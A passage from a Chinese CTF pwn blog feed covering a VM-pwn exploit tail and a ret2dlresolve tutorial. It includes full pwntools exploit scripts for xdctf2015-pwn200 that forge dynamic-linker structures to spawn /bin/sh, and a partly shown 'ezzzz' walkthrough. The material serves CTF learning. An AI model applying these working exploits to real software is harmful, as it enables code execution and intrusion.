class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/aichch/glibc-all-in-one/libs/2.34-0ubuntu3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./starvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cmd = [<span class="number">10</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">6</span>]</span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;command:\n&#x27;</span>, <span class="string">&#x27; &#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cmd]).encode() + <span class="string">b&#x27; 16&#x27;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(sh,<span class="string">&#x27;b system&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">cost = [<span class="number">14</span>, <span class="number">0x404020</span>, <span class="comment"># 10   setvbuf@got</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 6    #mem[0]-&gt;reg[0]</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">0x30b90</span>, <span class="comment"># 10  根据libc修改</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">1</span>, <span class="comment"># 3     reg[0]-=reg[1]</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7      mem[0]=reg[0]</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0x404070</span>, <span class="comment"># 10  malloc@got</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0x401270</span>, <span class="comment"># 10   trigger  setvbuf</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7   mem[0]&lt;-reg[1]</span></span><br><span class="line">        <span class="number">2</span>, <span class="number">1</span>, <span class="comment"># 7   mem[1]&lt;-reg[2]清空malloc高地址</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0x4040D0</span>, <span class="comment"># 10   &amp;stdin</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0x4040D8</span>, <span class="comment"># 10  save &#x27;sh&#x27;</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">0x6873</span>, <span class="comment"># 10  &#x27;sh&#x27;</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 7     mem[0]&lt;-reg[0]  </span></span><br><span class="line">        <span class="number">2</span>, <span class="number">1</span>, <span class="comment"># 7    mem[1]&lt;-reg[2]</span></span><br><span class="line">        <span class="number">1</span>, <span class="number">2</span>, <span class="comment"># 7    mem[2]&lt;-reg[1]</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">0</span>, <span class="comment"># 10   clear mem</span></span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, <span class="comment"># 6      trigger malloc</span></span><br><span class="line">        <span class="number">0xdeadbeef</span>]</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;your cost:\n&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>.join([<span class="built_in">str</span>(v) <span class="keyword">for</span> v <span class="keyword">in</span> cost]).encode())</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">VMpwn</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="VMpwn" scheme="https://ixout.github.io/tags/VMpwn/"/>
    
  </entry>
  
  <entry>
    <title>some_rop</title>
    <link href="https://ixout.github.io/posts/57744/"/>
    <id>https://ixout.github.io/posts/57744/</id>
    <published>2023-11-04T13:58:25.000Z</published>
    <updated>2023-12-02T08:22:38.666Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ret2dl"><a href="#ret2dl" class="headerlink" title="ret2dl"></a>ret2dl</h1><p>一些前置知识见elf动态链接.md</p><hr><p>ret2dlresolve的情况更多适用于没有打印函数的程序</p><p>毕竟如果有打印函数,且有完成ret2dl的条件,那不如直接用ret2libc等方法</p><h2 id="链接过程"><a href="#链接过程" class="headerlink" title="链接过程"></a>链接过程</h2><h3 id="dl-runtime-resolve-link-map-reloc-arg"><a href="#dl-runtime-resolve-link-map-reloc-arg" class="headerlink" title="_dl_runtime_resolve(link_map,reloc_arg)"></a>_dl_runtime_resolve(link_map,reloc_arg)</h3><ol><li>用<code>link_map</code>访问<code>.dynamic</code>，取出<code>.dynstr</code>, <code>.dynsym</code>, <code>.rel.plt</code>的指针</li><li><code>.rel.plt + 第二个参数</code>求出当前函数的重定位表项<code>Elf_Rel</code>的指针，记作<code>rel</code></li><li><code>rel-&gt;r_info &gt;&gt; 8</code>作为<code>.dynsym</code>的下标，求出当前函数的符号表项<code>Elf_Sym</code>的指针，记作<code>sym</code></li><li><code>.dynstr + sym-&gt;st_name</code>得出符号名字符串指针</li><li>在动态链接库查找这个函数的地址，并且把地址赋值给<code>*rel-&gt;r_offset</code>，即GOT表</li><li>调用这个函数</li></ol><p>但_dl_runtime_resolve的主体其实是调用_dl_fixup</p><p><strong>_dl_fixup</strong>是在glibc/elf/dl-runtime.c实现的</p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="思路-1-直接控制重定位表项的相关内容"><a href="#思路-1-直接控制重定位表项的相关内容" class="headerlink" title="思路 1 - 直接控制重定位表项的相关内容"></a>思路 1 - 直接控制重定位表项的相关内容</h3><p>由于动态链接器最后在解析符号的地址时，是依据符号的名字进行解析的。因此，一个很自然的想法是直接修改动态字符串表 <code>.dynstr</code>，比如把某个函数在字符串表中对应的字符串修改为目标函数对应的字符串。但是，动态字符串表和代码映射在一起，是只读的。</p><p>此外，类似地，我们可以发现动态符号表、重定位表项都是只读的。</p><p>但是，假如我们可以控制程序执行流，那我们就可以伪造合适的重定位偏移，从而达到调用目标函数的目的。然而，这种方法比较麻烦，因为我们不仅需要伪造重定位表项，符号信息和字符串信息，而且我们还需要确保动态链接器在解析的过程中不会出错。</p><p><strong>即伪造一个全新的表项,截取调用resolve来触发</strong></p><h3 id="思路-2-间接控制重定位表项的相关内容"><a href="#思路-2-间接控制重定位表项的相关内容" class="headerlink" title="思路 2 - 间接控制重定位表项的相关内容"></a>思路 2 - 间接控制重定位表项的相关内容</h3><p>既然动态链接器会从 <code>.dynamic</code> 节中索引到各个目标节，那如果我们可以修改动态节中的内容，那自然就很容易控制待解析符号对应的字符串，从而达到执行目标函数的目的。</p><p><strong>即修改<code>.dynamic</code>的内容间接控制重定位表项</strong></p><h3 id="思路-3-伪造-link-map"><a href="#思路-3-伪造-link-map" class="headerlink" title="思路 3 - 伪造 link_map"></a>思路 3 - 伪造 link_map</h3><p>由于动态连接器在解析符号地址时，主要依赖于 link_map 来查询相关的地址。因此，如果我们可以成功伪造 link_map，也就可以控制程序执行目标函数。</p><p><strong>即修改GOT[1]伪造整个link_map(较难实现),又或者伪造link_map的部分l_info指针使其索引至伪造区域</strong></p><h2 id="64与32的一些差异"><a href="#64与32的一些差异" class="headerlink" title="64与32的一些差异"></a>64与32的一些差异</h2><ol><li><p>首先二者的<code>Elf_Rela</code>和<code>Elf_Dyn</code>结构体存在一些差异</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Elf32_Sym struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, align=<span class="number">0x4</span>, mappedto_1)</span><br><span class="line"><span class="number">00000000</span> st_name dd ?                            ; offset (<span class="number">0804824</span>C)</span><br><span class="line"><span class="number">00000004</span> st_value dd ?                           ; offset (<span class="number">00000000</span>)</span><br><span class="line"><span class="number">00000008</span> st_size dd ?</span><br><span class="line"><span class="number">0000000</span>C st_info db ?</span><br><span class="line"><span class="number">0000000</span>D st_other db ?</span><br><span class="line"><span class="number">0000000</span>E st_shndx dw ?</span><br><span class="line"><span class="number">00000010</span> Elf32_Sym ends</span><br><span class="line">    </span><br><span class="line"><span class="number">00000000</span> Elf64_Sym struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, align=<span class="number">0x8</span>, mappedto_1)</span><br><span class="line"><span class="number">00000000</span> st_name dd ?                            ; offset (<span class="number">00400378</span>)</span><br><span class="line"><span class="number">00000004</span> st_info db ?</span><br><span class="line"><span class="number">00000005</span> st_other db ?</span><br><span class="line"><span class="number">00000006</span> st_shndx dw ?</span><br><span class="line"><span class="number">00000008</span> st_value dq ?                           ; offset (<span class="number">00000000</span>)</span><br><span class="line"><span class="number">00000010</span> st_size dq ?</span><br><span class="line"><span class="number">00000018</span> Elf64_Sym ends</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> Elf32_Rel struc ; (<span class="keyword">sizeof</span>=<span class="number">0x8</span>, align=<span class="number">0x4</span>, copyof_2)</span><br><span class="line"><span class="number">00000000</span> r_offset dd ?</span><br><span class="line"><span class="number">00000004</span> r_info dd ?</span><br><span class="line"><span class="number">00000008</span> Elf32_Rel ends</span><br><span class="line">    </span><br><span class="line"><span class="number">00000000</span> Elf64_Rela struc ; (<span class="keyword">sizeof</span>=<span class="number">0x18</span>, align=<span class="number">0x8</span>, copyof_2)</span><br><span class="line"><span class="number">00000000</span> r_offset dq ?</span><br><span class="line"><span class="number">00000008</span> r_info dq ?</span><br><span class="line"><span class="number">00000010</span> r_addend dq ?</span><br><span class="line"><span class="number">00000018</span> Elf64_Rela ends    </span><br></pre></td></tr></table></figure></li><li><p>_dl_runtime_resolve的第二个参数,在32位中是该函数表项相对.rel.plt的字节偏移,而在64位中是该函数表项相对.rel.plt的下标索引</p></li><li>64位下还会验证DT_VERSYM,使用符号表索引作为版本号索引寻找版本号,需要将其置零以绕过检查</li><li>64位下dl_resolve的参数依然使用栈传递,dl_fixup则寄存器传递</li></ol><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015-pwn200"></a>xdctf2015-pwn200</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>wiki将其按照relro等级编译讲解</p><h4 id="no-relro"><a href="#no-relro" class="headerlink" title="no relro"></a>no relro</h4><p>在这种情况下，修改 <code>.dynamic</code> 会简单些。因为只需要修改 <code>.dynamic</code> 节中的字符串表的地址为伪造的字符串表的地址，并且相应的位置为目标字符串基本就行了。具体思路如下</p><ol><li>修改 .dynamic 节中字符串表的地址为伪造的地址</li><li>在伪造的地址处构造好字符串表，将 read 字符串替换为 system 字符串。</li><li>在特定的位置读取 /bin/sh 字符串。</li><li>调用 read 函数的 plt 的第二条指令，触发 <code>_dl_runtime_resolve</code> 进行函数解析，从而执行 system 函数。从这里也可以看出,只要能控制返回流,就算函数已经被解析也可以使用来ret2dl</li></ol><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>,<span class="string">&quot;splitw&quot;</span>,<span class="string">&quot;-h&quot;</span>]</span><br><span class="line">context.arch=<span class="string">&quot;i386&quot;</span></span><br><span class="line">p = process(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">rop = ROP(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./main_no_relro_32&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">rop.raw(offset*<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x08049804</span>+<span class="number">4</span>,<span class="number">4</span>) <span class="comment"># modify .dynstr pointer in .dynamic section to a specific location</span></span><br><span class="line">dynstr = elf.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).data()</span><br><span class="line">dynstr = dynstr.replace(<span class="string">&quot;read&quot;</span>,<span class="string">&quot;system&quot;</span>)</span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x080498E0</span>,<span class="built_in">len</span>((dynstr))) <span class="comment"># construct a fake dynstr section</span></span><br><span class="line">rop.read(<span class="number">0</span>,<span class="number">0x080498E0</span>+<span class="number">0x100</span>,<span class="built_in">len</span>(<span class="string">&quot;/bin/sh\x00&quot;</span>)) <span class="comment"># read /bin/sh\x00</span></span><br><span class="line">rop.raw(<span class="number">0x08048376</span>) <span class="comment"># the second instruction of read@plt </span></span><br><span class="line">rop.raw(<span class="number">0xdeadbeef</span>)</span><br><span class="line">rop.raw(<span class="number">0x080498E0</span>+<span class="number">0x100</span>)</span><br><span class="line"><span class="comment"># print(rop.dump())</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="built_in">len</span>(rop.chain())&lt;=<span class="number">256</span>)</span><br><span class="line">rop.raw(<span class="string">&quot;a&quot;</span>*(<span class="number">256</span>-<span class="built_in">len</span>(rop.chain())))</span><br><span class="line">p.send(rop.chain())</span><br><span class="line">p.send(p32(<span class="number">0x080498E0</span>))</span><br><span class="line">p.send(dynstr)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="partial-relro"><a href="#partial-relro" class="headerlink" title="partial relro"></a>partial relro</h4><p>在这种情况下，ELF 文件中的 .dynamic 节将会变成只读的，这时可以通过伪造重定位表项的方式来调用目标函数。</p><p>即在指定地址处依次伪造好某一个函数动态链接对应的rel,sym,str</p><p>并以此得到一个rel的下标</p><p>然后直接返回到plt公共表项,那么dl的第二个参数就可以由我们直接在栈中布置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28525)#***</span></span><br><span class="line">p=process(<span class="string">&#x27;./bof&#x27;</span>)<span class="comment">#***</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt0 = e.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt = e.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = e.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = e.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">offset=<span class="number">112</span><span class="comment">#***</span></span><br><span class="line">read_plt_addr=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">four_pop_ret=<span class="number">0x08048628</span></span><br><span class="line">leave_ret_addr=<span class="number">0x0804851A</span></span><br><span class="line">base_addr=<span class="number">0x0804a800</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr=base_addr+<span class="number">32</span></span><br><span class="line"></span><br><span class="line">align=<span class="number">0x10</span>-((fake_sym_addr-dynsym)&amp;<span class="number">0xf</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_sym_addr+=align</span><br><span class="line"></span><br><span class="line">st_name=fake_sym_addr+<span class="number">0x10</span>-dynstr<span class="comment">#字符串位置dynstr</span></span><br><span class="line"></span><br><span class="line">st_info=<span class="number">12</span></span><br><span class="line"></span><br><span class="line">fake_sym=p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(st_info)<span class="comment">#对应dynsym</span></span><br><span class="line"></span><br><span class="line">r_offset=e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">r_sym=(fake_sym_addr-dynsym)/<span class="number">0x10</span>   <span class="comment">#偏移是下标偏移</span></span><br><span class="line">r_type=<span class="number">0x7</span></span><br><span class="line">r_info=(<span class="built_in">int</span>(r_sym)&lt;&lt;<span class="number">8</span>)+(r_type)</span><br><span class="line">reloc_index=base_addr-rel_plt+<span class="number">24</span>    <span class="comment">#32位偏移是地址偏移,64位则是下标偏移</span></span><br><span class="line"></span><br><span class="line">fake_rel_plt=p32(r_offset)+p32(r_info)<span class="comment">#对应rel</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload1=offset*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">payload1+=p32(read_plt_addr) </span><br><span class="line">payload1+=p32(four_pop_ret)</span><br><span class="line">payload1+=p32(<span class="number">0</span>)</span><br><span class="line">payload1+=p32(base_addr)</span><br><span class="line">payload1+=p32(<span class="number">100</span>)</span><br><span class="line">payload1+=p32(base_addr-<span class="number">4</span>)</span><br><span class="line">payload1+=p32(leave_ret_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload2=p32(plt0)</span><br><span class="line">payload2+=p32(reloc_index)</span><br><span class="line"></span><br><span class="line">payload2+=<span class="string">b&#x27;abcd&#x27;</span><span class="comment">#调用函数返回地址</span></span><br><span class="line">payload2+=p32(base_addr+<span class="number">80</span>) <span class="comment">#指向binsh</span></span><br><span class="line">payload2+=<span class="string">b&#x27;aaaa&#x27;</span>   <span class="comment">#</span></span><br><span class="line">payload2+=<span class="string">b&#x27;bbbb&#x27;</span>   <span class="comment">#read有三个参数</span></span><br><span class="line">payload2+=fake_rel_plt</span><br><span class="line">payload2+=align*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">payload2+=fake_sym</span><br><span class="line">payload2+=<span class="string">b&#x27;system\x00&#x27;</span></span><br><span class="line">payload2+=(<span class="number">80</span>-<span class="built_in">len</span>(payload2))*<span class="string">b&#x27;a&#x27;</span></span><br><span class="line">payload2+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="ezzzz"><a href="#ezzzz" class="headerlink" title="ezzzz"></a>ezzzz</h3><p>题目很明显只有栈溢出漏洞，没有泄露函数，没有canary、pie，考虑使用ret2resolve，是经典的利用手法。</p><p>题目编译使用的较老的GCC-5.4.0编译的，使得dynamic段的RELA和JMPREL合并成一个段，但是dl_fixup函数中会用到JMPREL，所以需要额外的恢复DT_JMPREL的值。之后就是用题目给的gadget完成利用。</p><h4 id="gadgets"><a href="#gadgets" class="headerlink" title="gadgets"></a>gadgets</h4><p>题目给了两个gadget：<br><strong>gadget1</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_400606</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+14h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = *(_QWORD *)(qword_601040 + a1);</span><br><span class="line">  qword_601040 = v4;</span><br><span class="line">  result = (<span class="type">unsigned</span> <span class="type">int</span>)a1;</span><br><span class="line">  dword_601048 = a1;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v4;</span><br><span class="line">    qword_601028[a3] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( !a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v4;</span><br><span class="line">    qword_601020[a3] = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其可以不断深入解引用指针,并可以将解引用出的内容写到指定内存中</p><p>在该题我们可以利用DT_debug表项,找到_r_debug全局结构体,再由_r_debug结构体<strong>找到elf的link_map</strong>,再由elf的link_map用两次l_next找到libc的link_map,再由link_map的l_info[DT_PLTGOT]表项找到libc的.got.plt,然后最后可以在libc的.got.plt公共表项中<strong>找到resolve的地址</strong></p><p><strong>gadget2</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_40067C</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( qword_601030 != <span class="number">0xDEADBEEF</span>LL || qword_601030 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xBEEFDEAD</span>LL;</span><br><span class="line">    <span class="keyword">if</span> ( qword_601030 == <span class="number">0xBEEFDEAD</span>LL )</span><br><span class="line">    &#123;</span><br><span class="line">      result = a3;</span><br><span class="line">      *(_QWORD *)(qword_601028[a1] + <span class="number">8LL</span> * a2) = a3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    result = v4;</span><br><span class="line">    qword_601040 = v4;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该gadget可以修改内存上的一个指针指向的区域的内容</p><p>我们可以利用其修改在上一个gadget中被我们写入内存的link_map</p><p>以恢复link_map的DT_JMPREL以及置零DT_Versym</p><h4 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h4><ol><li>将magicnumber覆盖成0xbeefdead，实现初始化sea.head为dt_debug。将栈迁移到bss</li><li>通过gadget1获取linkmap和resolver地址，并将其写到任意地址。</li><li>通过gadget2修改linkmap的内容，bypass versym和JMPRel。</li><li>伪造dynrela、dynsym、dynstr</li><li>劫持执行流到resolver，调用resolver获取shell。</li></ol><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 